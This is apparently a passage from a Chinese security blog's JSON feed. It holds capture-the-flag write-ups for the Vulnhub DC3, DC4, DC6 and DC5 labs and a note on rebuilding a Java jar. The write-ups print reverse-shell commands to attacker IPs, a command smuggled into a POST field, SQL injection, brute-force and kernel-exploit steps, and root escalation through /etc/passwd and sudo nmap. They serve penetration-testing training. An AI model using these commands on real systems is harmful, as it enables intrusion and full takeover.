172.21.34.31.\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.41s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.04s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nNmap scan report for 172.21.34.31\nHost is up (0.00072s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA\n|_http-generator: Joomla! - Open Source Content Management\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Home\nMAC Address: 08:00:27:2E:55:BC (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 198.048 days (since Wed Mar 10 08:55:41 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=259 (Good luck!)\nIP ID Sequence Generation: All zeros\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.73 ms 172.21.34.31\n\nNSE: Script Post-scanning.\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.28 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br></div></div><p>发现80端口，运行的Joomla</p>\n<h2 id=\"_0x03-漏洞利用\"> 0x03 漏洞利用</h2>\n<p>使用msf查看Joomla版本为3.7.0</p>\n<p><img src=\"/assets/img/image-20210924102654550.png\" alt=\"image-20210924102654550\" /></p>\n<p>搜索Joomla 3.7.0版本漏洞</p>\n<p><img src=\"/assets/img/image-20210924102850545.png\" alt=\"image-20210924102850545\" /></p>\n<p>发现CVE-2017-8917 SQL注入漏洞： https://www.exploit-db.com/exploits/42033</p>\n<p>上sqlmap</p>\n<div><pre><code>sqlmap -u \"http://172.21.34.31/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T '#__users' -C username,password --dump\n</code></pre>\n<div><span>1</span><br></div></div><p>发现用户</p>\n<p><img src=\"/assets/img/image-20210924103753282.png\" alt=\"image-20210924103753282\" /></p>\n<p>使用john爆破，得到密码</p>\n<p><img src=\"/assets/img/image-20210924104911090.png\" alt=\"image-20210924104911090\" /></p>\n<p>在<code>http://172.21.34.31/administrator/index.php</code>登录，发现模板编辑功能，可以愉快的加马了，修改Beez3模板下index.php，加上一句话</p>\n<p><img src=\"/assets/img/image-20210924111319969.png\" alt=\"image-20210924111319969\" /></p>\n<p>修改完成后将Beez3模板设置为默认模板，使用蚁剑连接成功</p>\n<p><img src=\"/assets/img/image-20210924111451058.png\" alt=\"image-20210924111451058\" /></p>\n<p><img src=\"/assets/img/image-20210924111544587.png\" alt=\"image-20210924111544587\" /></p>\n<p>先拿shell，kali上运行</p>\n<div><pre><code>nc -lvp 4444\n</code></pre>\n<div><span>1</span><br></div></div><p>因为靶机上是openbsd nc，不支持-e，所以使用以下命令反弹shell</p>\n<div><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.141.134 4444 &gt;/tmp/f\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20210924141311663.png\" alt=\"image-20210924141311663\" /></p>\n<h2 id=\"_0x04-提权\"> 0x04 提权</h2>\n<p>查看当前目录下，未找到flag相关文件，考虑提权，根据ubuntu和内核版本搜索相关漏洞</p>\n<div><pre><code>searchsploit -w ubuntu 16.04 4.4\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20210924141536034.png\" alt=\"image-20210924141536034\" /></p>\n<p>使用CVE-2016-4557：https://www.exploit-db.com/exploits/39772</p>\n<p>kali下载EXP</p>\n<div><pre><code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip  --no-check-certificate\n</code></pre>\n<div><span>1</span><br></div></div><p>启动web服务</p>\n<div><pre><code>python -m SimpleHTTPServer 8090\n</code></pre>\n<div><span>1</span><br></div></div><p>靶机下载，解压，编译运行</p>\n<div><pre><code>wget http://172.21.34.30:8090/39772.zip\nunzip 39772.zip\ncd 39772\ntar xvf exploit.tar\ncd ebpf_mapfd_doubleput_exploit\nsh compile.sh\n./doubleput\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><p>提权成功获得root权限，在<code>/root/</code>下发现flag文件，获得flag</p>\n<p><img src=\"/assets/img/image-20210924142338904.png\" alt=\"image-20210924142338904\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20210924101423240.png",
      "date_published": "2021-09-24T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 DC4-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc4/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc4/",
      "content_html": "<h2 id=\"_0x01-部署\"> 0x01 部署</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-4,313/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-4,313/</a></p>\n</blockquote>\n<p><strong>DESCRIPTION</strong></p>\n<p>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>\n<p>Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.</p>\n<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>\n<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</p>\n<p>只有一个flag</p>\n<h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>靶机使用vmware部署，NAT模式</p>\n<p>nmap扫描网段</p>\n<div><pre><code>nmap -sP 192.168.190.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20210926153642099.png\" alt=\"image-20210926153642099\" /></p>\n<p>发现靶机IP：192.168.190.139，继续扫描</p>\n<div><pre><code>nmap -T5 -A -v -p- 192.168.190.139\n</code></pre>\n<div><span>1</span><br></div></div><p>结果：</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 14:27 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating ARP Ping Scan at 14:27\nScanning 192.168.190.139 [1 port]\nCompleted ARP Ping Scan at 14:27, 0.04s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 14:27\nCompleted Parallel DNS resolution of 1 host. at 14:27, 0.00s elapsed\nInitiating SYN Stealth Scan at 14:27\nScanning 192.168.190.139 [65535 ports]\nDiscovered open port 80/tcp on 192.168.190.139\nDiscovered open port 22/tcp on 192.168.190.139\nCompleted SYN Stealth Scan at 14:27, 1.00s elapsed (65535 total ports)\nInitiating Service scan at 14:27\nScanning 2 services on 192.168.190.139\nCompleted Service scan at 14:27, 6.02s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 192.168.190.139\nNSE: Script scanning 192.168.190.139.\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.11s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nNmap scan report for 192.168.190.139\nHost is up (0.00045s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n| ssh-hostkey: \n|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)\n|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)\n|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)\n80/tcp open  http    nginx 1.15.10\n| http-methods: \n|_  Supported Methods: GET HEAD POST\n|_http-server-header: nginx/1.15.10\n|_http-title: System Tools\nMAC Address: 00:0C:29:B3:F5:3B (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 198.838 days (since Thu Mar 11 18:21:01 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=256 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.45 ms 192.168.190.139\n\nNSE: Script Post-scanning.\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.81 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br></div></div><p>发现80端口，登陆后只有一个登录界面，未发现其他公开的CMS或组件</p>\n<p><img src=\"/assets/img/image-20210926153952656.png\" alt=\"image-20210926153952656\" /></p>\n<h2 id=\"_0x03-渗透\"> 0x03 渗透</h2>\n<p>尝试使用burpsuite进行web爆破，根据系统名包含admin，指定用户名admin，先爆破密码</p>\n<p><img src=\"/assets/img/image-20210926154453036.png\" alt=\"image-20210926154453036\" /></p>\n<p>爆破发现admin密码happy</p>\n<p>使用admin登录后，发现web提供了执行命令的功能，需要执行的命令通过post参数传递</p>\n<p><img src=\"/assets/img/image-20210926154602455.png\" alt=\"image-20210926154602455\" /></p>\n<p>使用nc回弹shell，kali执行</p>\n<div><pre><code>nc -lvp 4444 \n</code></pre>\n<div><span>1</span><br></div></div><p>使用hackbar发送post参数<code>radio=nc 192.168.190.129 4444 -e /bin/bash&amp;submit=Run</code>，获得反弹shell</p>\n<p><img src=\"/assets/img/image-20210926154739554.png\" alt=\"image-20210926154739554\" /></p>\n<p>执行命令获取方便观察的shell</p>\n<div><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;\nexport TERM=xterm\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><h2 id=\"_0x04-提权\"> 0x04 提权</h2>\n<p>查看/etc/passwd，发现几个用户，去home下查看，只有jim下存在文件，backups下有一个old-passwds.bak文件，mbox文件无权限，test.sh没什么用处</p>\n<p>使用nc获取old-passwds.bak文件</p>\n<div><pre><code>nc -nvlp 5555 &gt; old-passwords.bak\nnc 192.168.141.134 5555 &lt; /home/jim/backups/old-passwords.bak\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>然后使用old-passwords.bak文件对jim进行爆破</p>\n<div><pre><code>hydra -l jim -P old-passwords.bak -vV 192.168.190.139 ssh\n</code></pre>\n<div><span>1</span><br></div></div><p>爆破成功得到密码：</p>\n<p><img src=\"/assets/img/image-20210926160224587.png\" alt=\"image-20210926160224587\" /></p>\n<p>登录jim后发现mbox下内容：</p>\n<p><img src=\"/assets/img/image-20210926160501768.png\" alt=\"image-20210926160501768\" /></p>\n<p>似乎是一个邮件，在/var/mail/jim中发现邮件内容：</p>\n<p><img src=\"/assets/img/image-20210926160535935.png\" alt=\"image-20210926160535935\" /></p>\n<p>得到charles密码</p>\n<p>登录charles，执行<code>sudo -l</code>发现charly可以执行teehee，可以将标准输入复制到我们选择的文件中</p>\n<p>创建一个拥有root权限的账号</p>\n<div><pre><code><span>echo</span> <span>\"test::0:0:::/bin/sh\"</span> <span>|</span> <span>sudo</span> teehee -a /etc/passwd\n<span>su</span> <span>test</span>\n<span>whoami</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>在/root/下找到flag</p>\n<p><img src=\"/assets/img/image-20210926160832848.png\" alt=\"image-20210926160832848\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20210926153642099.png",
      "date_published": "2021-09-26T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "JAVA中jar包反编译再重新生成jar文件",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%80%86%E5%90%91/1.JAVA%E4%B8%ADjar%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91%E5%86%8D%E9%87%8D%E6%96%B0%E7%94%9F%E6%88%90jar%E6%96%87%E4%BB%B6/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%80%86%E5%90%91/1.JAVA%E4%B8%ADjar%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91%E5%86%8D%E9%87%8D%E6%96%B0%E7%94%9F%E6%88%90jar%E6%96%87%E4%BB%B6/",
      "content_html": "<h3 id=\"_1-使用工具-jd-gui\"> <strong>1. 使用工具：jd-gui</strong></h3>\n<p>https://github.com/java-decompiler/jd-gui/releases</p>\n<h3 id=\"_2-使用portecle-jar举例-使用jd-gui打开jar包\"> <strong>2. 使用portecle.jar举例，使用jd-gui打开jar包</strong></h3>\n<p><img src=\"/assets/img/image-20220421165629456.png\" alt=\"image-20220421165629456\" /></p>\n<h3 id=\"_3-复制net-sf-portecle-dgeneratecertificate-class文件内容-在portecle-jar同目录级别下创建文本文件1-java-放入class内容\"> <strong>3. 复制net.sf.portecle.DGenerateCertificate.class文件内容，在portecle.jar同目录级别下创建文本文件1.java，放入class内容</strong></h3>\n<h3 id=\"_4-修改代码\"> <strong>4.修改代码</strong></h3>\n<p><img src=\"/assets/img/image2022-4-14_17-8-7.png\" alt=\"image2022-4-14_17-8-7\" /></p>\n<h3 id=\"_5-重新编译dgeneratecertificate-java\"> <strong>5.重新编译DGenerateCertificate.java</strong></h3>\n<p>因为代码存在依赖，所以直接使用javac编译会报错，编译时需要引入依赖jar包</p>\n<div><pre><code>javac 1.java -classpath .\\portecle.jar -d 1\n</code></pre>\n<div><span>1</span><br></div></div><p>这里-d 是指编译结果的输出位置</p>\n<p>编译完成后，在 1\\net\\sf\\portecle 位置下生成了新的 DGenerateCertificate.class 文件</p>\n<h3 id=\"_6-将新的class文件合入jar包\"> <strong>6.将新的class文件合入jar包</strong></h3>\n<p>将 portecle.jar 拷入文件夹 1 下，在文件夹 1 下执行命令</p>\n<div><pre><code>jar uf .\\portecle.jar .\\net\\sf\\portecle\\DGenerateCertificate.class\n</code></pre>\n<div><span>1</span><br></div></div><p>class 文件被合入jar包</p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421165629456.png",
      "date_published": "2022-04-14T00:00:00.000Z",
      "date_modified": "2022-04-21T09:42:58.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "逆向"
      ]
    },
    {
      "title": "靶机  DC6-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc6/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc6/",
      "content_html": "<h2 id=\"_0x01-介绍\"> 0x01 介绍</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-6,315/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-6,315/</a></p>\n</blockquote>\n<p><strong>DESCRIPTION</strong></p>\n<p>DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>\n<p>This isn't an overly difficult challenge so should be great for beginners.</p>\n<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>\n<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>\n<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</p>\n<p>OK, this isn't really a clue as such, but more of some &quot;we don't want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</p>\n<p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code> That should save you a few years. 😉</p>\n<p><strong>NOTE: You WILL need to edit your hosts file on your pentesting device so that it reads something like:</strong></p>\n<div><pre><code>192.168.0.142 wordy\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>扫描IP</p>\n<div><pre><code>nmap -sP 172.16.89.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211005150145884.png\" alt=\"image-20211005150145884\" /></p>\n<p>发现ip：172.16.89.7</p>\n<p>进一步扫描</p>\n<div><pre><code>nmap -T5 -A -v -p- 172.16.89.7\n</code></pre>\n<div><span>1</span><br></div></div><p>结果</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 15:02 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.00s elapsed\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.00s elapsed\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.00s elapsed\nInitiating ARP Ping Scan at 15:02\nScanning 172.16.89.7 [1 port]\nCompleted ARP Ping Scan at 15:02, 0.02s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 15:02\nCompleted Parallel DNS resolution of 1 host. at 15:02, 0.00s elapsed\nInitiating SYN Stealth Scan at 15:02\nScanning 172.16.89.7 [65535 ports]\nDiscovered open port 22/tcp on 172.16.89.7\nDiscovered open port 80/tcp on 172.16.89.7\nCompleted SYN Stealth Scan at 15:02, 5.10s elapsed (65535 total ports)\nInitiating Service scan at 15:02\nScanning 2 services on 172.16.89.7\nCompleted Service scan at 15:02, 6.54s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 172.16.89.7\nNSE: Script scanning 172.16.89.7.\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.65s elapsed\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.03s elapsed\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.00s elapsed\nNmap scan report for 172.16.89.7\nHost is up (0.0010s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n| ssh-hostkey: \n|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)\n|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)\n|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Did not follow redirect to http://wordy/\nMAC Address: 00:0C:29:9F:2E:8D (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 198.048 days (since Sun Mar 21 13:53:15 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=259 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.04 ms 172.16.89.7\n\nNSE: Script Post-scanning.\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.00s elapsed\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.00s elapsed\nInitiating NSE at 15:02\nCompleted NSE at 15:02, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 14.14 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br></div></div><p>修改host文件</p>\n<div><pre><code>echo &quot;172.16.89.7 wordy&quot; &gt;&gt; /etc/hosts\n</code></pre>\n<div><span>1</span><br></div></div><p>访问http://wordy，发现目标是wordpress搭建的网站</p>\n<p><img src=\"/assets/img/image-20211005150502759.png\" alt=\"image-20211005150502759\" /></p>\n<h2 id=\"_0x03-渗透\"> 0x03 渗透</h2>\n<p>使用wps扫描网站用户</p>\n<div><pre><code>wpscan --url http://wordy --enumerate u\n</code></pre>\n<div><span>1</span><br></div></div><p>根据提示生成密码字典</p>\n<div><pre><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt\n</code></pre>\n<div><span>1</span><br></div></div><p>使用wpscan爆破</p>\n<div><pre><code>wpscan --url http://wordy --passwords passwords.txt\n</code></pre>\n<div><span>1</span><br></div></div><p>爆破出一个账号：mark，密码：helpdesk01</p>\n<p><img src=\"/assets/img/image-20211005162459020.png\" alt=\"image-20211005162459020\" /></p>\n<p>使用爆破得到的账号登陆后，发现安装有Active Monitor插件</p>\n<div><pre><code>searchsploit Activity Monitor -w\n</code></pre>\n<div><span>1</span><br></div></div><p>发现存在漏洞</p>\n<p>https://www.exploit-db.com/exploits/50110</p>\n<p>下载利用，得到shell，在kali上回弹shell</p>\n<p><img src=\"/assets/img/image-20211005162756068.png\" alt=\"image-20211005162756068\" /></p>\n<p>升级shell</p>\n<div><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;\nexport TERM=xterm\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>翻一下/home，在mark下发现graham的密码</p>\n<p><img src=\"/assets/img/image-20211005163415161.png\" alt=\"image-20211005163415161\" /></p>\n<p>切换用户到graham，运行sudo -l</p>\n<p><img src=\"/assets/img/image-20211005164152979.png\" alt=\"image-20211005164152979\" /></p>\n<p>可以使用jens权限执行sh脚本，获得jens权限</p>\n<div><pre><code><span>echo</span> <span>\"/bin/sh\"</span> <span>>></span> /home/jens/backups.sh\n<span>sudo</span> -u jens /home/jens/backups.sh\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>执行sudo -l</p>\n<p><img src=\"/assets/img/image-20211005164709678.png\" alt=\"image-20211005164709678\" /></p>\n<p>可以执行nmap，参考前面nmap越权方法</p>\n<div><pre><code><span>echo</span> <span>'os.execute(\"/bin/sh\")'</span> <span>></span> /tmp/root.nse\n<span>cat</span> /tmp/root.nse\n<span>sudo</span> nmap --script<span>=</span>/tmp/root.nse\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p><img src=\"/assets/img/image-20211005164930280.png\" alt=\"image-20211005164930280\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20211005150145884.png",
      "date_published": "2021-10-05T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 DC5-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc5/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc5/",
      "content_html": "<h2 id=\"_0x01-部署\"> 0x01 部署</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-5,314/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-5,314/</a></p>\n</blockquote>\n<p><strong>DESCRIPTION</strong></p>\n<p>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>\n<p>The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).</p>\n<p>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.</p>\n<p>And just for the record, there is no phpmailer exploit involved. 😃</p>\n<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>\n<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>\n<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</p>\n<p>只有一个flag</p>\n<h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>nmap扫描网段</p>\n<div><pre><code>nmap -sP 172.16.89.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211005093413765.png\" alt=\"image-20211005093413765\" /></p>\n<p>发现靶机IP：172.16.89.6，继续扫描</p>\n<div><pre><code>nmap -T5 -A -v -p- 172.16.89.6\n</code></pre>\n<div><span>1</span><br></div></div><p>结果：</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 09:35 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 09:35\nCompleted NSE at 09:35, 0.00s elapsed\nInitiating NSE at 09:35\nCompleted NSE at 09:35, 0.00s elapsed\nInitiating NSE at 